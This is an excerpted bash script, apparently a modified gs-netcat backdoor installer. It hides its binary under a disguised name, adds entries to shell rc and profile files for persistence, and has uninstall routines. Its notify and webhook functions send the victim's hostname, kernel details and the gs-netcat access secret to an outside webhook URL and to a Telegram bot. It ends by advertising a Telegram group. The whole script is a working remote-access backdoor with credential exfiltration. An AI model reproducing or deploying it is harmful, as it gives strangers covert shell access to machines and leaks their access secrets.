...
notify() {
    ...
    curl -s -X POST \
        ...
        -d "{\"msg\":\"$msg\"}" \
        https://himpsimakassar.org/webhook.php > /dev/null 2>&1
}
...
BIN_HIDDEN_NAME_DEFAULT="Seoven"
...
mk_file() {
    local fn oldest pdir pdir_added
    fn="$1"
    local exists
    pdir="$(dirname "$fn")"
    [[ -e "$fn" ]] && exists=1
...
uninstall_rc() {
    ...
    fn="$1"
    [[ ! -f "$fn" ]] && return
    grep -F -- "${hname}" "$fn" &>/dev/null || return
    mk_file "$fn" || return
    echo "Removing ${fn}..."
    D="$(grep -v -F -- "${hname}" "$fn")"
    echo "$D" >"${fn}" || return
    [[ ! -s "${fn}" ]] && rm -f "${fn:?}" 2>/dev/null
}
...
uninstall() {
    ...
    for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
        ...
        uninstall_rm "${SERVICE_DIR}/${hn}.dat"
    done
    for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
    ...
    uninstall_rm "${TMPDIR}/._gs-netcat"
...
install_user_profile() {
    local rc_filename_status rc_file rc_filename
    rc_filename="$1"
...
test_network() {
    ...
    message="Secret '${GS_SECRET}' is already used."
    [[ $ret -eq 0 ]] && {
        telegramToken="${GS_TG_TOKEN}"
        chatId="${GS_TG_CHATID}"
        urlencode() {
            local string="$1"
        ...
        if [[ -n "$telegramToken" ]] && [[ -n "$chatId" ]]; then
            ...
            if command -v curl >/dev/null 2>&1; then
                curl -s "$telegramApiUrl" > /dev/null 2>&1
            elif command -v wget >/dev/null 2>&1; then
                wget -qO- "$telegramApiUrl" > /dev/null 2>&1
            fi
        fi
        FAIL_OUT "$message"
        HOWTO_CONNECT_OUT
...
webhooks() {
    ...
    local text="$(hostname 2>/dev/null || echo 'unknown') --- $(uname -rom 2>/dev/null || echo 'unknown') --- gs-netcat -i -s ${GS_SECRET:-unknown}"
...
notify "ðŸš€ Deploy dimulai dari $(hostname 2>/dev/null || echo 'unknown')"
...
notify "âœ… Deploy selesai di $(hostname 2>/dev/null || echo 'unknown') - Secret: ${GS_SECRET:-unknown}"

echo -e "--> ${CW}Join us on Telegram - https://t.me/seokolot${CN}"
